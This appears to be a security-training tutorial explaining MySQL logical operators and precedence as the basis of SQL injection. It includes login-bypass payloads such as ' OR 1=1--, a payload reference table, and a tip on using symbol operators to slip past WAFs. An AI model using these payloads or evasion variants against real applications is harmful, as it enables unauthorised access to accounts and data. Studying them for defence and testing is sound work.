# SQL Operators

SQL logical operators are the engine behind both query filtering and SQL injection payloads. Understanding how AND, OR, and NOT evaluate conditions, and in what order, is what separates a working injection from one that silently fails.

***

## The Three Core Operators

| Operator | Symbol | Returns True When |
|---------|--------|------------------|
| AND | `&&` | Both conditions are true |
| OR | `\|\|` | At least one condition is true |
| NOT | `!` | The condition is false |

MySQL represents true as `1` and false as `0`. Any non-zero value evaluates as true, which becomes relevant when injecting numeric expressions.

```sql
SELECT 1 = 1 AND 'test' = 'test';  -- 1 (true: both true)
SELECT 1 = 1 AND 'test' = 'abc';   -- 0 (false: second is false)
SELECT 1 = 1 OR  'test' = 'abc';   -- 1 (true: first is true)
SELECT 1 = 2 OR  'test' = 'abc';   -- 0 (false: both false)
SELECT NOT 1 = 1;                   -- 0 (false: inverts true)
SELECT NOT 1 = 2;                   -- 1 (true: inverts false)
```

***

## Operator Precedence

When a query contains multiple operators, MySQL evaluates them in a fixed order. From highest to lowest priority:

```
1. Division (/), Multiplication (*), Modulus (%)
2. Addition (+), Subtraction (-)
3. Comparisons (=, >, <, >=, <=, !=, LIKE)
4. NOT (!)
5. AND (&&)
6. OR (||)
```

This precedence determines how complex conditions resolve. Given:

```sql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
```

The evaluation steps are:
1. `3 - 2` resolves to `1` (subtraction first)
2. `username != 'tom'` and `id > 1` resolve as comparisons
3. AND combines both conditions last

Result: only rows where username is not `tom` AND id is greater than 1.

***

## Why OR Precedence Matters for Authentication Bypass

The fact that AND evaluates before OR is critical to understanding the classic login bypass payload. Consider a typical login query:

```sql
SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT';
```

Injecting `admin'--` into the username field comments out the password check entirely. But the OR-based bypass works differently:

```sql
-- Injection: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

Because AND has higher precedence than OR, this evaluates as:

```sql
WHERE username = '' OR ('1'='1' AND password = '')
```

The `AND password = ''` part applies only to the `'1'='1'` branch. Since `'1'='1'` is true and `password = ''` may be false, that sub-expression fails. But the full OR condition can still return rows where `username = ''` is true. More reliable payloads use:

```sql
-- Injection: ' OR 1=1--
WHERE username = '' OR 1=1-- AND password = ''
-- Comment removes the AND entirely: WHERE username = '' OR 1=1
-- 1=1 is always true, returns all rows
```

***

## Practical Operator Usage in Queries

```sql
-- Exclude a specific user
SELECT * FROM logins WHERE username != 'john';

-- Multiple conditions with AND
SELECT * FROM logins WHERE username != 'john' AND id > 1;

-- OR to retrieve specific IDs
SELECT * FROM logins WHERE id = 1 OR id = 3;

-- NOT with LIKE to exclude a pattern
SELECT * FROM logins WHERE username NOT LIKE 'admin%';
```

***

## Operator Injection Payloads Reference

Understanding the operators directly maps to common injection payloads:

| Goal | Payload | Resulting Logic |
|------|---------|----------------|
| Always-true condition | `' OR 1=1--` | WHERE clause always evaluates true |
| Comment out remainder | `'--` | Everything after `'` is ignored |
| Bypass AND password check | `' OR '1'='1'--` | OR short-circuits the AND |
| Extract via boolean | `' AND 1=1--` (true) vs `' AND 1=2--` (false) | Page differs based on condition |
| NOT-based filter bypass | `' OR NOT 1=2--` | NOT false = true, always matches |

The symbol forms (`&&`, `||`, `!`) can be used interchangeably with the keyword forms in MySQL. Both `OR 1=1` and `|| 1=1` produce identical results, but some WAFs block keyword-based operators while missing symbol equivalents, making the symbol forms useful as bypass variants.
